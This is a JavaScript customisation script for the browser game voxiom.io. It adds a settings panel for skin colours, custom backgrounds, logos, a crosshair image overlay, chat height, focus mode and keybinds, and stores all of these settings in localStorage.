const originalSkinURL1 = 'https://voxiom.io/package/cb1d14c1ff0efb6a282b.png';
const originalSkinURL2 = 'https://voxiom.io/package/aef55bdd0c3c3c3734f8.png';
const originalSkinURL3 = 'https://voxiom.io/package/ecca1227c2e0406be225.png';

const defaultColors = {
	default: {
		head: '#24b44d',
		body: '#ee1c23',
	},
	ruby: {
		head: '#ffffff',
		body: '#ee1c23',
	},
	sapphire: {
		head: '#ffffff',
		body: '#1919ff',
	},
};

const savedColors = {
	default: {
		head:
			localStorage.getItem('defaultHeadColor') || defaultColors.default.head,
		body:
			localStorage.getItem('defaultBodyColor') || defaultColors.default.body,
	},
	ruby: {
		head: localStorage.getItem('rubyHeadColor') || defaultColors.ruby.head,
		body: localStorage.getItem('rubyBodyColor') || defaultColors.ruby.body,
	},
	sapphire: {
		head:
			localStorage.getItem('sapphireHeadColor') || defaultColors.sapphire.head,
		body:
			localStorage.getItem('sapphireBodyColor') || defaultColors.sapphire.body,
	},
};

const container = document.createElement('div');
container.style.position = 'absolute';
container.style.top = '10px';
container.style.right = '10px';
container.style.padding = '10px';
container.style.backgroundColor = '#141414';
container.style.display =
	localStorage.getItem('isContainerHidden') === 'true' ? 'none' : 'flex';
container.style.flexDirection = 'column';
container.style.overflow = 'auto';
container.style.maxHeight = '555px';
container.style.border = '1px solid #555555';
container.style.fontFamily = 'cursive';

container.style.scrollbarWidth = 'thin';
container.style.scrollbarColor = '#888888 #333333';

const bgsetWrapper = document.createElement('div');
bgsetWrapper.style.display = 'flex';
bgsetWrapper.style.alignItems = 'center';

const bgsetCheckbox = document.createElement('input');
bgsetCheckbox.type = 'checkbox';
bgsetCheckbox.checked = JSON.parse(
	localStorage.getItem('bgsetChecked') || 'false'
);
bgsetCheckbox.style.marginRight = '10px';
bgsetCheckbox.style.marginTop = '3px';

const bgsetLabel = document.createElement('span');
bgsetLabel.textContent = 'enable custom bg';
bgsetLabel.style.fontSize = '14px';
bgsetLabel.style.marginTop = '3px';

const uploadWrapper = document.createElement('div');
uploadWrapper.style.display = 'flex';
uploadWrapper.style.alignItems = 'center';
uploadWrapper.style.marginTop = '11px';

const uploadLabel = document.createElement('span');
uploadLabel.textContent = 'upload bg:';
uploadLabel.style.marginRight = '5px';
uploadLabel.style.fontSize = '14px';
uploadLabel.style.marginTop = '2px';
uploadLabel.style.marginBottom = '5px';

const urlInput = document.createElement('input');
urlInput.type = 'text';
urlInput.style.background = '#3c3c3c';
urlInput.style.padding = '2px';
urlInput.style.paddingLeft = '4px';
urlInput.style.paddingRight = '4px';
urlInput.style.border = 'none';
urlInput.style.color = 'white';
urlInput.style.width = '107px';
urlInput.placeholder = 'enter url';
urlInput.style.marginBottom = '3px';
urlInput.style.marginRight = '10px';

const fileInput = document.createElement('input');
fileInput.type = 'file';
fileInput.style.marginBottom = '3px';
fileInput.style.width = '85px';

const bgElement = document.querySelector('.bNczYf');
const styleElement = document.createElement('style');
document.head.appendChild(styleElement);

fileInput.addEventListener('change', (event) => {
	const file = event.target.files?.[0];
	if (!file) return;

	if (!file.type.startsWith('image/')) {
		alert("You can't set this as your background lmao gtfo");
		urlInput.value = '';
		fileInput.value = '';
		return;
	}

	const reader = new FileReader();
	reader.onload = (e) => {
		const fileURL = e.target.result;
		urlInput.value = fileURL;
		localStorage.setItem('backgroundURL', fileURL);
		updateBackground();
	};
	reader.readAsDataURL(file);
});

window.addEventListener('load', () => {
	urlInput.value = localStorage.getItem('backgroundURL') || '';
	updateBackground();
});

bgsetCheckbox.addEventListener('change', () => {
	localStorage.setItem('bgsetChecked', bgsetCheckbox.checked);
	updateBackground();
});

urlInput.addEventListener('input', () => {
	if (!urlInput.value.trim()) {
		localStorage.removeItem('backgroundURL');
		updateBackground();
	}
});

urlInput.addEventListener('focus', () => {
	initialURLValue = urlInput.value.trim();
});

urlInput.addEventListener('blur', async () => {
	const url = urlInput.value.trim();
	if (url === initialURLValue) return;

	const imagePattern = /\.(gif|jpe?g|png|webp|svg|bmp|tiff|avif)$/i;
	if (imagePattern.test(url)) {
		setBackgroundImage(url);
		return;
	}

	try {
		const response = await fetch(url, { method: 'HEAD' });
		if (
			response.ok &&
			response.headers.get('Content-Type')?.startsWith('image/')
		) {
			setBackgroundImage(url);
		} else {
			throw new Error();
		}
	} catch {
		alert("You can't set this as your background lmao gtfo");
		urlInput.value = '';
		fileInput.value = '';
	}
});

function setBackgroundImage(url) {
	localStorage.setItem('backgroundURL', url);
	updateBackground();
}

function updateBackground() {
	const savedURL = localStorage.getItem('backgroundURL') || '';
	const isBgsetChecked = JSON.parse(
		localStorage.getItem('bgsetChecked') || 'false'
	);

	styleElement.textContent =
		isBgsetChecked && savedURL
			? `.bNczYf { background-image: url(${savedURL}); filter: brightness(0.7); }`
			: `.bNczYf { background-image: url("https://voxiom.io/package/c30b27cd3f6c8d9bb236.jpg"); filter: none; }`;
}

const style = document.createElement('style');
style.innerHTML = `div::-webkit-scrollbar{width: 1px;height:1px;}div::-webkit-scrollbar-thumb{background-color: #888888;border-radius: 10px;}div::-webkit-scrollbar-track{background-color: #333333;}`;
document.head.appendChild(style);

const hideText = document.createElement('span');
hideText.style.marginBottom = '7px';
hideText.style.fontSize = '14px';
container.appendChild(hideText);

function createColorPicker(savedColor, storageKey) {
	const colorPicker = document.createElement('input');
	colorPicker.type = 'color';
	colorPicker.value = savedColor;
	colorPicker.style.height = '22px';
	colorPicker.style.width = '30px';

	colorPicker.addEventListener('input', function () {
		const selectedColor = colorPicker.value;
		localStorage.setItem(storageKey, selectedColor);
	});

	return colorPicker;
}

const hr = document.createElement('hr');
hr.style.marginBottom = '7px';
hr.style.border = '1px solid gray';
container.appendChild(hr);

const info = document.createElement('span');
info.textContent = 'head - body color';
info.style.fontSize = '14px';
info.style.marginBottom = '9px';
info.style.marginTop = '3px';
container.appendChild(info);

const ver = document.createElement('div');
ver.innerHTML = 'V. 10 Feb 2025';
ver.style.fontSize = '14px';
ver.style.position = 'absolute';
ver.style.right = '8px';
ver.style.top = '10px';
container.appendChild(ver);

['default', 'ruby', 'sapphire'].forEach((skin) => {
	const skinWrapper = document.createElement('div');
	skinWrapper.style.display = 'flex';
	skinWrapper.style.alignItems = 'center';
	skinWrapper.style.marginBottom = '3px';

	const headPicker = createColorPicker(
		savedColors[skin].head,
		`${skin}HeadColor`
	);
	const bodyPicker = createColorPicker(
		savedColors[skin].body,
		`${skin}BodyColor`
	);

	bodyPicker.style.marginLeft = '3px';
	bodyPicker.style.border = 'none';
	headPicker.style.border = 'none';
	bodyPicker.style.width = '40px';
	headPicker.style.width = '40px';

	const label = document.createElement('span');
	label.textContent = `${skin[0]}${skin.slice(1)} skin`;
	label.style.marginLeft = '7px';
	label.style.fontSize = '14px';
	label.style.color = 'white';

	skinWrapper.appendChild(headPicker);
	skinWrapper.appendChild(bodyPicker);
	skinWrapper.appendChild(label);

	container.appendChild(skinWrapper);
});

const checkboxWrapper = document.createElement('div');
checkboxWrapper.style.display = 'flex';
checkboxWrapper.style.alignItems = 'center';
checkboxWrapper.style.marginTop = '7px';

const defaultSkinCheckbox = document.createElement('input');
defaultSkinCheckbox.type = 'checkbox';
defaultSkinCheckbox.checked = localStorage.getItem('useDefaultSkin') === 'true';
defaultSkinCheckbox.style.marginRight = '10px';

const checkboxLabel = document.createElement('span');
checkboxLabel.textContent = 'skin swapper';
checkboxLabel.style.fontSize = '14px';
checkboxLabel.style.color = 'white';

checkboxWrapper.appendChild(defaultSkinCheckbox);
checkboxWrapper.appendChild(checkboxLabel);
container.appendChild(checkboxWrapper);

defaultSkinCheckbox.addEventListener('change', function () {
	const isChecked = defaultSkinCheckbox.checked;
	localStorage.setItem('useDefaultSkin', isChecked ? 'true' : 'false');
});

const hrr = document.createElement('hr');
hrr.style.border = '1px solid gray';
hrr.style.marginTop = '8px';
hrr.style.marginBottom = '5px';
container.appendChild(hrr);

document.addEventListener('DOMContentLoaded', () => {
	localStorage.setItem('useFocusMode', 'false');
	focusModeCheckbox.checked = false;
	toggleFocusMode(false);
});

const focusModeWrapper = document.createElement('div');
focusModeWrapper.style.display = 'flex';
focusModeWrapper.style.alignItems = 'center';

const focusModeCheckbox = document.createElement('input');
focusModeCheckbox.type = 'checkbox';
focusModeCheckbox.checked = false;
focusModeCheckbox.style.marginRight = '10px';
focusModeCheckbox.style.marginTop = '3px';

const focusModeLabel = document.createElement('span');
focusModeLabel.style.fontSize = '14px';
focusModeLabel.style.marginTop = '3px';

focusModeWrapper.appendChild(focusModeCheckbox);
focusModeWrapper.appendChild(focusModeLabel);
container.appendChild(focusModeWrapper);

const hrr1 = document.createElement('hr');
hrr1.style.border = '1px solid gray';
hrr1.style.marginTop = '8px';
hrr1.style.marginBottom = '5px';
container.appendChild(hrr1);

function toggleFocusMode(isChecked) {
	localStorage.setItem('useFocusMode', isChecked ? 'true' : 'false');

	const elementsToModify = document.querySelectorAll(
		'.cxSTIe, .ekCLHU, .eFhDSk, .lpfJAq *, .lpdfTz *, .sc-kqnjJL'
	);

	elementsToModify.forEach((element) => {
		element.style.setProperty(
			'visibility',
			isChecked ? 'hidden' : '',
			'important'
		);
	});

	const scKqnjJL = document.querySelectorAll('.sc-kqnjJL');
	scKqnjJL.forEach((element) => {
		element.style.marginLeft = isChecked ? '-35px' : '';
	});
}

focusModeCheckbox.addEventListener('change', function () {
	toggleFocusMode(focusModeCheckbox.checked);
});

const DEFAULT_CHAT_HEIGHT = '147px';

const chathWrapper = document.createElement('div');
chathWrapper.style.display = 'flex';
chathWrapper.style.alignItems = 'center';

const chathCheckbox = document.createElement('input');
chathCheckbox.type = 'checkbox';
chathCheckbox.checked = JSON.parse(
	localStorage.getItem('chathChecked') || 'false'
);
chathCheckbox.style.marginRight = '10px';
chathCheckbox.style.marginTop = '3px';

const chathLabel = document.createElement('span');
chathLabel.style.fontSize = '14px';
chathLabel.style.marginTop = '3px';
chathLabel.textContent = `custom chat height`;

const chathNumberInput = document.createElement('input');
chathNumberInput.type = 'number';
chathNumberInput.style.width = '91px';
chathNumberInput.value = localStorage.getItem('chathHeight') || '147';
chathNumberInput.style.marginLeft = '7px';
chathNumberInput.style.marginTop = '4px';
chathNumberInput.style.background = '#3c3c3c';
chathNumberInput.style.border = 'none';
chathNumberInput.style.color = 'white';
chathNumberInput.style.padding = '2px';
chathNumberInput.style.paddingLeft = '4px';

const applyCustomHeight = () => {
	const elements = document.querySelectorAll('.lpfJAq *, .lpdfTz *');
	const maxHeight = chathCheckbox.checked
		? chathNumberInput.value + 'px'
		: DEFAULT_CHAT_HEIGHT;
	elements.forEach((el) => (el.style.maxHeight = maxHeight));
};

if (chathCheckbox.checked) applyCustomHeight();

chathCheckbox.addEventListener('change', () => {
	localStorage.setItem('chathChecked', chathCheckbox.checked);
	applyCustomHeight();
});

chathNumberInput.addEventListener('input', () => {
	localStorage.setItem('chathHeight', chathNumberInput.value);
	if (chathCheckbox.checked) applyCustomHeight();
});

const observer = new MutationObserver(() => {
	if (chathCheckbox.checked) applyCustomHeight();
});
observer.observe(document.body, {
	childList: true,
	subtree: true,
});

const pxlabel = document.createElement('span');
pxlabel.textContent = 'px';
pxlabel.style.fontSize = '14px';
pxlabel.style.marginLeft = '5px';

chathWrapper.appendChild(chathCheckbox);
chathWrapper.appendChild(chathLabel);
chathWrapper.appendChild(chathNumberInput);
chathWrapper.appendChild(pxlabel);
container.appendChild(chathWrapper);

const hrr2 = document.createElement('hr');
hrr2.style.border = '1px solid gray';
hrr2.style.marginTop = '8px';
hrr2.style.marginBottom = '5px';
container.appendChild(hrr2);


bgsetWrapper.appendChild(bgsetCheckbox);
bgsetWrapper.appendChild(bgsetLabel);
container.appendChild(bgsetWrapper);
uploadWrapper.appendChild(uploadLabel);
uploadWrapper.appendChild(urlInput);
uploadWrapper.appendChild(fileInput);
container.appendChild(uploadWrapper);

const hrr3 = document.createElement('hr');
hrr3.style.border = '1px solid gray';
hrr3.style.marginTop = '8px';
hrr3.style.marginBottom = '5px';
container.appendChild(hrr3);

const logoWrapper = document.createElement('div');
logoWrapper.style.display = 'flex';
logoWrapper.style.alignItems = 'center';

const logoCheckbox = document.createElement('input');
logoCheckbox.type = 'checkbox';
logoCheckbox.style.marginRight = '10px';
logoCheckbox.style.marginTop = '3px';

const logoLabel = document.createElement('span');
logoLabel.textContent = 'enable custom logo';
logoLabel.style.fontSize = '14px';
logoLabel.style.marginTop = '3px';

const logoUploadWrapper = document.createElement('div');
logoUploadWrapper.style.display = 'flex';
logoUploadWrapper.style.alignItems = 'center';
logoUploadWrapper.style.marginTop = '10px';

const logoUploadLabel = document.createElement('span');
logoUploadLabel.textContent = 'upload logo:';
logoUploadLabel.style.marginRight = '5px';
logoUploadLabel.style.fontSize = '14px';
logoUploadLabel.style.marginTop = '2px';
logoUploadLabel.style.marginBottom = '5px';

const logoUrlInput = document.createElement('input');
logoUrlInput.type = 'text';
logoUrlInput.style.background = '#3c3c3c';
logoUrlInput.style.padding = '2px';
logoUrlInput.style.paddingLeft = '4px';
logoUrlInput.style.paddingRight = '4px';
logoUrlInput.style.border = 'none';
logoUrlInput.style.color = 'white';
logoUrlInput.style.width = '96px';
logoUrlInput.placeholder = 'enter url';
logoUrlInput.style.marginRight = '10px';

const logoFileInput = document.createElement('input');
logoFileInput.type = 'file';
logoFileInput.style.marginTop = '-1px';
logoFileInput.style.width = '85px';

const logoHeightWrapper = document.createElement('div');
logoHeightWrapper.style.display = 'flex';
logoHeightWrapper.style.alignItems = 'center';
logoHeightWrapper.style.marginTop = '9px';
logoHeightWrapper.style.marginBottom = '2px';

const logoHeightLabel = document.createElement('span');
logoHeightLabel.textContent = 'logo size - margin top - margin bottom';
logoHeightLabel.style.marginRight = '5px';
logoHeightLabel.style.fontSize = '13px';

const logoReset = document.createElement('div');
logoReset.innerHTML = `<svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24">
  <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.651 7.65a7.131 7.131 0 0 0-12.68 3.15M18.001 4v4h-4m-7.652 8.35a7.13 7.13 0 0 0 12.68-3.15M6 20v-4h4"/>
</svg>
`;
logoReset.style.color = 'gray';
logoReset.style.marginBottom = '-6.5px';
logoReset.style.cursor = 'pointer';
logoReset.title = "reset logo's size, margin top, margin bottom";

const logoHeightInput = document.createElement('input');
logoHeightInput.type = 'number';
logoHeightInput.value = 200;
logoHeightInput.style.paddingLeft = '4px';
logoHeightInput.style.background = '#3c3c3c';
logoHeightInput.style.border = 'none';
logoHeightInput.style.color = 'white';
logoHeightInput.style.padding = '2px';
logoHeightInput.style.paddingLeft = '4px';
logoHeightInput.style.width = '83px';
logoHeightInput.style.marginRight = '5px';
logoHeightInput.style.marginTop = '2px';

logoWrapper.appendChild(logoCheckbox);
logoWrapper.appendChild(logoLabel);
container.appendChild(logoWrapper);

const styleTag =
	document.querySelector('style.custom-logo') ||
	document.createElement('style');
styleTag.className = 'custom-logo';
document.head.appendChild(styleTag);

function updateLogoImage(imageSource) {
	const heightValue = `${logoHeightInput.value}px`;
	styleTag.textContent = `
		.sc-ibSMNl {
			content: url('${imageSource}');
			height: ${heightValue};
			width: auto;
			filter: drop-shadow(0 0 20px black);
		}`;
}

function saveToLocalStorage() {
	localStorage.setItem(
		'customLogoSettings',
		JSON.stringify({
			checkboxEnabled: logoCheckbox.checked,
			imageUrl: logoUrlInput.value,
			heightValue: logoHeightInput.value,
		})
	);
}

function loadFromLocalStorage() {
	const settings = JSON.parse(localStorage.getItem('customLogoSettings')) || {};
	logoCheckbox.checked = settings.checkboxEnabled || false;
	logoUrlInput.value = settings.imageUrl || '';
	logoHeightInput.value = settings.heightValue || 200;

	if (logoCheckbox.checked && settings.imageUrl) {
		updateLogoImage(settings.imageUrl);
	}
}

function handleFileInput(event) {
	const file = event.target.files[0];
	if (!file) return;

	const reader = new FileReader();
	reader.onload = (e) => {
		const base64Url = e.target.result;
		logoUrlInput.value = base64Url;
		if (logoCheckbox.checked) updateLogoImage(base64Url);
		saveToLocalStorage();
	};
	reader.readAsDataURL(file);
}

logoCheckbox.addEventListener('change', () => {
	if (logoCheckbox.checked && logoUrlInput.value) {
		updateLogoImage(logoUrlInput.value);
	} else {
		styleTag.textContent = '';
	}
	saveToLocalStorage();
});

logoUrlInput.addEventListener('input', () => {
	if (logoCheckbox.checked) updateLogoImage(logoUrlInput.value);
	saveToLocalStorage();
});

logoFileInput.addEventListener('change', handleFileInput);

logoHeightInput.addEventListener('input', () => {
	if (logoCheckbox.checked) updateLogoImage(logoUrlInput.value);
	saveToLocalStorage();
});

loadFromLocalStorage();

logoReset.addEventListener('click', function () {
	localStorage.removeItem('logoMarginBottom');
	localStorage.removeItem('logoMarginTop');
	let customLogoSettings =
		JSON.parse(localStorage.getItem('customLogoSettings')) || {};
	customLogoSettings.heightValue = '200';
	localStorage.setItem(
		'customLogoSettings',
		JSON.stringify(customLogoSettings)
	);
	location.reload();
});

const logosWrapper = document.createElement('div');
logosWrapper.style.display = 'flex';
logosWrapper.style.alignItems = 'center';
logosWrapper.style.marginTop = '10px';

const logosTop = document.createElement('input');
logosTop.type = 'number';
logosTop.style.width = '84px';
logosTop.style.background = '#3c3c3c';
logosTop.style.border = 'none';
logosTop.style.color = 'white';
logosTop.style.padding = '2px';
logosTop.style.paddingLeft = '4px';
logosTop.style.marginRight = '5px';
logosTop.style.marginTop = '2px';
logosTop.value = localStorage.getItem('logoMarginTop') || 50;

const logosBottom = document.createElement('input');
logosBottom.type = 'number';
logosBottom.style.width = '83px';
logosBottom.style.background = '#3c3c3c';
logosBottom.style.padding = '2px';
logosBottom.style.paddingLeft = '4px';
logosBottom.style.border = 'none';
logosBottom.style.color = 'white';
logosBottom.style.marginTop = '2px';
logosBottom.style.paddingLeft = '4px';
logosBottom.value = localStorage.getItem('logoMarginBottom') || 40;

function updateLogoMargins() {
	const marginTop = logosTop.value || 0;
	const marginBottom = logosBottom.value || 0;

	const applyMargins = () => {
		const logoElement = document.querySelector('.sc-ibSMNl');
		if (logoElement) {
			logoElement.style.marginTop = `${marginTop}px`;
			logoElement.style.marginBottom = `${marginBottom}px`;
		} else {
			console.warn('Logo element not found. Retrying...');
			setTimeout(applyMargins, 1);
		}
	};

	applyMargins();
	localStorage.setItem('logoMarginTop', marginTop);
	localStorage.setItem('logoMarginBottom', marginBottom);
}

logosTop.addEventListener('input', updateLogoMargins);
logosBottom.addEventListener('input', updateLogoMargins);

window.addEventListener('load', () => {
	const savedMarginTop = localStorage.getItem('logoMarginTop') || 50;
	const savedMarginBottom = localStorage.getItem('logoMarginBottom') || 40;

	logosTop.value = savedMarginTop;
	logosBottom.value = savedMarginBottom;

	updateLogoMargins();
});

logoUploadWrapper.appendChild(logoUploadLabel);
logoUploadWrapper.appendChild(logoUrlInput);
logoUploadWrapper.appendChild(logoFileInput);
container.appendChild(logoUploadWrapper);

logoHeightWrapper.appendChild(logoHeightLabel);
logoHeightWrapper.appendChild(logoReset);
container.appendChild(logoHeightWrapper);

logosWrapper.appendChild(logoHeightInput);
logosWrapper.appendChild(logosTop);
logosWrapper.appendChild(logosBottom);
container.appendChild(logosWrapper);

const hrr4 = document.createElement('hr');
hrr4.style.border = '1px solid gray';
hrr4.style.marginTop = '13px';
hrr4.style.marginBottom = '0';
container.appendChild(hrr4);

function updateCrosshair() {
	const isEnabled = localStorage.getItem('crosshairEnabled') === 'true';
	const crosshairUrl = localStorage.getItem('crosshairUrl') || '';
	const crosshairSize = localStorage.getItem('crosshairSize') || '50px';

	let crosshair = document.getElementById('custom-crosshair');
	if (!crosshair) {
		crosshair = document.createElement('div');
		crosshair.id = 'custom-crosshair';
		crosshair.style.position = 'fixed';
		crosshair.style.top = '50%';
		crosshair.style.left = '50%';
		crosshair.style.transform = 'translate(-50%, -50%)';
		crosshair.style.pointerEvents = 'none';
		document
			.getElementById('app')
			.insertAdjacentElement('afterbegin', crosshair);
	}

	if (isEnabled && crosshairUrl) {
		crosshair.style.width = crosshairSize;
		crosshair.style.height = crosshairSize;
		crosshair.style.backgroundImage = `url(${crosshairUrl})`;
		crosshair.style.backgroundSize = 'contain';
		crosshair.style.backgroundRepeat = 'no-repeat';
		crosshair.style.display = 'block';
	} else {
		crosshair.style.display = 'none';
	}
}

const crosshairWrapper = document.createElement('div');
crosshairWrapper.style.display = 'flex';
crosshairWrapper.style.flexDirection = 'column';
crosshairWrapper.style.marginTop = '10px';
crosshairWrapper.style.alignItems = 'flex-start';

const enableCheckboxWrapper = document.createElement('div');
enableCheckboxWrapper.style.display = 'flex';
enableCheckboxWrapper.style.alignItems = 'center';
enableCheckboxWrapper.style.marginBottom = '5px';

const enableCheckbox = document.createElement('input');
enableCheckbox.type = 'checkbox';
enableCheckbox.style.marginRight = '5px';
enableCheckbox.id = 'enable-crosshair';
enableCheckboxWrapper.appendChild(enableCheckbox);

const enableLabel = document.createElement('label');
enableLabel.textContent = 'enable brosshair';
enableLabel.style.marginLeft = '5px';
enableLabel.style.fontSize = '14px';
enableLabel.htmlFor = 'enable-crosshair';
enableCheckboxWrapper.appendChild(enableLabel);
crosshairWrapper.appendChild(enableCheckboxWrapper);

const chwrapwrap = document.createElement('div');
chwrapwrap.style.display = 'flex';
chwrapwrap.style.alignItems = 'center';
chwrapwrap.style.marginTop = '3px';
crosshairWrapper.appendChild(chwrapwrap);

const chLabel = document.createElement('span');
chLabel.textContent = 'upload ch:';
chLabel.style.marginRight = '5px';
chLabel.style.fontSize = '14px';
chwrapwrap.appendChild(chLabel);

const crosshairUrlInput = document.createElement('input');
crosshairUrlInput.type = 'text';
crosshairUrlInput.placeholder = 'Enter URL';
crosshairUrlInput.style.marginTop = '2px';
crosshairUrlInput.style.width = '109px';
crosshairUrlInput.style.marginRight = '9px';
crosshairUrlInput.style.border = 'none';
crosshairUrlInput.style.color = 'white';
crosshairUrlInput.style.background = '#3c3c3c';
crosshairUrlInput.style.padding = '2px';
crosshairUrlInput.style.paddingLeft = '4px';
crosshairUrlInput.style.paddingRight = '4px';
chwrapwrap.appendChild(crosshairUrlInput);

const sfileInput = document.createElement('input');
sfileInput.type = 'file';
sfileInput.accept = 'image/*';
sfileInput.style.marginTop = '2px';
sfileInput.style.width = '85px';
chwrapwrap.appendChild(sfileInput);

const sizeSliderWrapper = document.createElement('div');
sizeSliderWrapper.style.display = 'flex';
sizeSliderWrapper.style.alignItems = 'center';
sizeSliderWrapper.style.marginTop = '11px';

const sizeLabel = document.createElement('span');
sizeLabel.textContent = 'size:';
sizeLabel.style.fontSize = '14px';
sizeLabel.style.marginTop = '-4px';
sizeSliderWrapper.appendChild(sizeLabel);

const sizeSlider = document.createElement('input');
sizeSlider.type = 'range';
sizeSlider.min = '5';
sizeSlider.max = '200';
sizeSlider.step = '5';
sizeSlider.value = '100';
sizeSlider.style.marginLeft = '5px';
sizeSlider.style.width = '195px';
sizeSliderWrapper.appendChild(sizeSlider);

const sizeValueDisplay = document.createElement('span');
sizeValueDisplay.textContent = `${sizeSlider.value}px`;
sizeValueDisplay.style.fontSize = '14px';
sizeValueDisplay.style.marginLeft = '5px';
sizeSliderWrapper.appendChild(sizeValueDisplay);

crosshairWrapper.appendChild(sizeSliderWrapper);
container.appendChild(crosshairWrapper);

const updateSettings = () => {
	const crosshairUrl = crosshairUrlInput.value.trim();
	const crosshairSize = sizeSlider.value + 'px';

	sizeValueDisplay.textContent = `${sizeSlider.value}px`;

	localStorage.setItem('crosshairSize', crosshairSize);
	localStorage.setItem('crosshairEnabled', enableCheckbox.checked);
	if (crosshairUrl) {
		localStorage.setItem('crosshairUrl', crosshairUrl);
	}
	updateCrosshair();
};

enableCheckbox.addEventListener('change', () => {
	updateSettings();
});

crosshairUrlInput.addEventListener('input', () => {
	updateSettings();
});

sizeSlider.addEventListener('input', () => {
	updateSettings();
});

sfileInput.addEventListener('change', (event) => {
	if (event.target.files && event.target.files[0]) {
		const reader = new FileReader();
		reader.onload = function (e) {
			crosshairUrlInput.value = e.target.result;
			localStorage.setItem('crosshairUrl', e.target.result);
			updateSettings();
		};
		reader.readAsDataURL(event.target.files[0]);
	}
});

window.addEventListener('load', () => {
	enableCheckbox.checked = localStorage.getItem('crosshairEnabled') === 'true';
	crosshairUrlInput.value = localStorage.getItem('crosshairUrl') || '';
	sizeSlider.value = parseInt(localStorage.getItem('crosshairSize')) || 100;
	sizeValueDisplay.textContent = `${sizeSlider.value}px`;

	updateCrosshair();
});

const resetEverythingButton = document.createElement('button');
resetEverythingButton.textContent = 'restore defaults';
resetEverythingButton.style.padding = '3px';
resetEverythingButton.style.cursor = 'pointer';
resetEverythingButton.style.background = 'none';
resetEverythingButton.style.border = '1px solid white';
resetEverythingButton.style.color = 'white';
resetEverythingButton.style.fontSize = '12px';
resetEverythingButton.title = 'resets everything into default';

const defaultKeybinds = {
	focusKeybind: {
		key: 'k',
		modifier: 'alt',
	},
	containerKeybind: {
		key: 'z',
		modifier: 'alt',
	},
};

resetEverythingButton.addEventListener('click', function () {
	const confirmation = confirm(
		'This action cannot be undone. Are you sure you want to reset everything?'
	);
	if (confirmation) {
		localStorage.removeItem('crosshairEnabled');
		localStorage.removeItem('crosshairUrl');
		localStorage.removeItem('crosshairSize');

		enableCheckbox.checked = false;
		crosshairUrlInput.value = '';
		sizeSlider.value = 100;
		sizeValueDisplay.textContent = '100px';
		updateCrosshair();

		Object.keys(defaultColors).forEach((skin) => {
			localStorage.setItem(`${skin}HeadColor`, defaultColors[skin].head);
			localStorage.setItem(`${skin}BodyColor`, defaultColors[skin].body);
		});

		const customStyleTag = document.querySelector('style[data-custom="true"]');
		if (customStyleTag) customStyleTag.remove();

		const cssCheckbox = document.querySelector('input[type="checkbox"]');
		if (
			cssCheckbox &&
			cssCheckbox.nextSibling?.textContent.includes('Enable Custom CSS')
		) {
			cssCheckbox.checked = false;
			localStorage.setItem('cssCheckbox', 'false');
		}

		const textarea = document.querySelector('textarea');
		if (textarea) {
			textarea.value = '';
			localStorage.removeItem('customCSS');
		}

		const applyCSS = () => {
			const existingLink = document.querySelector('link[data-css]');
			if (existingLink) {
				existingLink.remove();
			}

			const defaultCSS = 'https://kryptonvox.netlify.app/main.css';
			const link = document.createElement('link');
			link.rel = 'stylesheet';
			link.href = defaultCSS;
			link.dataset.css = 'true';
			document.head.appendChild(link);
		};
		applyCSS();

		localStorage.setItem('useFocusMode', 'false');
		toggleFocusMode(false);

		localStorage.setItem('useDefaultSkin', 'false');
		defaultSkinCheckbox.checked = false;

		localStorage.setItem('chathChecked', 'false');
		localStorage.removeItem('chathHeight');
		localStorage.removeItem('logoMarginBottom');
		localStorage.removeItem('logoMarginTop');

		localStorage.setItem('bgsetChecked', 'false');
		document.querySelector('.bNczYf').style.backgroundImage = '';
		document.querySelector('.bNczYf').style.filter = '';
		localStorage.removeItem('backgroundURL');
		urlInput.value = '';
		fileInput.value = '';
		bgsetCheckbox.checked = false;

		localStorage.removeItem('customLogoSettings');
		const styleTag = document.querySelector('style.custom-logo');
		if (styleTag) styleTag.remove();
		logoCheckbox.checked = false;
		logoUrlInput.value = '';

		focusKeybind = {
			...defaultKeybinds.focusKeybind,
		};
		containerKeybind = {
			...defaultKeybinds.containerKeybind,
		};

		saveKeybinds();

		xhxcheckbox.checked = false;
		localStorage.setItem('uiHintDisabled', 'false');

		updateUIHintVisibility();

		location.reload();
	}
});

let focusKeybind = {
	key: 'k',
	modifier: 'alt',
};
let containerKeybind = {
	key: 'z',
	modifier: 'alt',
};

function saveKeybinds() {
	localStorage.setItem('focusKeybind', JSON.stringify(focusKeybind));
	localStorage.setItem('containerKeybind', JSON.stringify(containerKeybind));
}

function loadKeybinds() {
	const savedFocusKeybind = JSON.parse(localStorage.getItem('focusKeybind'));
	const savedContainerKeybind = JSON.parse(
		localStorage.getItem('containerKeybind')
	);

	if (savedFocusKeybind) focusKeybind = savedFocusKeybind;
	if (savedContainerKeybind) containerKeybind = savedContainerKeybind;
}

const xhxwrapper = document.createElement('div');
xhxwrapper.style.display = 'flex';
xhxwrapper.style.alignItems = 'center';
xhxwrapper.style.marginTop = '7px';
xhxwrapper.style.marginBottom = '7px';

const xhxcheckbox = document.createElement('input');
xhxcheckbox.type = 'checkbox';

const xhxlabel = document.createElement('span');
xhxlabel.textContent = 'disable opening UI hint';
xhxlabel.style.fontSize = '14px';
xhxlabel.style.marginLeft = '7px';

const uiHintSpan = document.createElement('span');
uiHintSpan.style.position = 'fixed';
uiHintSpan.style.bottom = '5px';
uiHintSpan.style.right = '5px';
uiHintSpan.style.fontSize = '11px';
uiHintSpan.style.backgroundColor = 'rgba(0,0,0,0.5)';
uiHintSpan.style.color = 'white';
uiHintSpan.style.padding = '5px';
uiHintSpan.style.zIndex = '9998';

function updateuilabel() {
	const containerKeybind = JSON.parse(
		localStorage.getItem('containerKeybind') || '{}'
	);
	const key = containerKeybind.key || 'z';
	const modifier = containerKeybind.modifier || 'alt';
	uiHintSpan.textContent = `${modifier} + ${key.toUpperCase()} to open UI`;
}

function updateUIHintVisibility() {
	if (xhxcheckbox.checked) {
		uiHintSpan.style.display = 'none';
		localStorage.setItem('uiHintDisabled', 'true');
	} else {
		uiHintSpan.style.display = 'flex';
		localStorage.setItem('uiHintDisabled', 'false');
	}
}

function initializeState() {
	const isHintDisabled = localStorage.getItem('uiHintDisabled') === 'true';
	xhxcheckbox.checked = isHintDisabled;
	updateUIHintVisibility();
}

const appElement = document.getElementById('app');
if (appElement) {
	appElement.insertAdjacentElement('afterbegin', uiHintSpan);
	uiHintSpan.style.display = 'none';
}

updateuilabel();
xhxcheckbox.addEventListener('change', updateUIHintVisibility);
initializeState();

